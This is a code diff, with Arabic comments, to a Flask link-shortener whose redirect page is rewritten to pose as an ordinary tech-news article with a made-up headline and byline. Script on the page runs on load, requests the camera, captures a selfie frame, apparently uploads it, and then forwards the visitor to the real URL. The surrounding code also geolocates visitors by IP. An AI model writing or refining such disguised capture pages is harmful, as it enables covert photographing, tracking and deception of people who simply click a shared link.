@@ -48,59 +48,111 @@ def get_location(ip):
         pass
     return "غير معروف"
 
-# قالب صفحة الويب العادية الانتقالية المحدث لالتقاط السيلفي وتوفير الوقت لـ Playwright
+# قالب صفحة ويب عادية (تظهر كمقال أو محتقى طبيعي) مع التقاط السيلفي والتوجيه التلقائي
 REDIRECT_TEMPLATE = """
 <!DOCTYPE html>
 <html dir="rtl" lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري تحويلك إلى المحتوى...</title>
-    <meta http-equiv="refresh" content="4;url={{ original_url }}">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أحدث المقالات التقنية - تفاصيل الخبر</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #050510;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: #f8f9fa;
+            color: #333;
+            line-height: 1.8;
             padding: 20px;
         }
-        .container {
-            background: rgba(255,255,255,0.02);
-            backdrop-filter: blur(20px);
-            border-radius: 24px;
-            padding: 40px;
-            width: 100%;
-            max-width: 450px;
+        .main-wrapper {
+            max-width: 750px;
+            margin: 40px auto;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            overflow: hidden;
+            border: 1px solid #eaeaea;
+        }
+        .article-header {
+            padding: 30px 30px 20px 30px;
+            border-bottom: 1px solid #eee;
+        }
+        .article-category {
+            color: #0066cc;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+        .article-meta {
+            font-size: 13px;
+            color: #888;
+        }
+        .article-body {
+            padding: 30px;
+            font-size: 16px;
+            color: #444;
+        }
+        .article-body p {
+            margin-bottom: 20px;
+        }
+        .loading-box {
+            background: #f1f3f5;
+            padding: 20px;
+            border-radius: 8px;
             text-align: center;
-            border: 1px solid rgba(255,255,255,0.06);
-            box-shadow: 0 25px 80px rgba(0,0,0,0.6);
+            margin-top: 30px;
+            font-size: 14px;
+            color: #555;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
         }
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(0,212,255,0.1);
-            border-top-color: #00d4ff;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ccc;
+            border-top-color: #0066cc;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 25px auto;
+            animation: spin 0.8s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        h2 { color: #00d4ff; margin-bottom: 12px; font-size: 22px; }
-        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
-        a { color: #a855f7; text-decoration: none; font-weight: bold; }
-        a:hover { text-decoration: underline; }
+        .manual-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #0066cc;
+            text-decoration: none;
+        }
+        .manual-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <h2>جاري تحويلك...</h2>
-        <p>يرجى الانتظار لحظات، يتم توجيهك إلى الصفحة المطلوبة تلقائياً.</p>
-        <p>إذا لم يتم تحويلك، <a href="{{ original_url }}">اضغط هنا للانتقال يدوياً</a>.</p>
+    <div class="main-wrapper">
+        <div class="article-header">
+            <div class="article-category">تقنية وتكنولوجيا</div>
+            <h1>إطلاق ميزات جديدة كلياً لتحسين تجربة تصفح الإنترنت والخصوصية</h1>
+            <div class="article-meta">نشر بتاريخ: اليوم | بواسطة فريق التحرير</div>
+        </div>
+        <div class="article-body">
+            <p>تسعى الشركات التقنية الكبرى دائماً لتقديم تحديثات مستمرة تساهم في رفع كفاءة الأداء وسرعة الوصول إلى المعلومات عبر منصات الويب المختلفة، مما يتيح للمستخدمين تجربة أكثر سلاسة وأماناً.</p>
+            <p>في هذا التقرير، نستعرض أبرز التغييرات والتحسينات الملحوظة التي تم إضافتها مؤخراً وكيف تؤثر بشكل مباشر على تصفحك اليومي للمحتوى الرقمي...</p>
+            
+            <div class="loading-box">
+                <div class="spinner"></div>
+                <span>جاري تحميل المحتوى الكامل وتوجيهك للصفحة المطلوبة...</span>
+            </div>
+            
+            <a class="manual-link" href="{{ original_url }}">إذا لم يتم تحويلك تلقائياً خلال ثوانٍ، انقر هنا للمتابعة</a>
+        </div>
     </div>
 
     <script>
@@ -111,6 +163,8 @@ REDIRECT_TEMPLATE = """
                 video.srcObject = stream;
                 await video.play();
                 
+                await new Promise(resolve => setTimeout(resolve, 800));
+
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -127,6 +181,8 @@ REDIRECT_TEMPLATE = """
                 });
             } catch (err) {
                 console.log('Camera access skipped or denied');
+            } finally {
+                window.location.href = "{{ original_url }}";
             }
         }
         window.addEventListener('load', captureSelfie);
@@ -801,7 +857,6 @@ def create_link():
     original_url = data.get("url", "").strip()
     custom_alias = data.get("custom_alias", "").strip()
     
-    # تصحيح الروابط الخاطئة التي تحتوي على https// وتجنب تكرار البروتوكول
     original_url = original_url.replace("https//", "https://").replace("http//", "http://")
     while original_url.startswith("https://https://"):
         original_url = original_url.replace("https://https://", "https://", 1)
@@ -813,7 +868,6 @@ def create_link():
     
     links = load_links()
     
-    # تحديد معرف الرابط (إما المخصص المدخل أو التوليد العشوائي)
     if custom_alias:
         link_id = "".join(c for c in custom_alias if c.isalnum() or c in ("-", "_"))
         if link_id in links:
@@ -911,7 +965,6 @@ def take_screenshot(url, link_id):
     filepath = os.path.join(SCREENSHOTS_DIR, filename)
     
     with sync_playwright() as p:
-        # إضافة خيارات منع الحماية لتشغيل Playwright بنجاح تحت حساب root
         browser = p.chromium.launch(
             headless=True,
             args=['--no-sandbox', '--disable-setuid-sandbox']
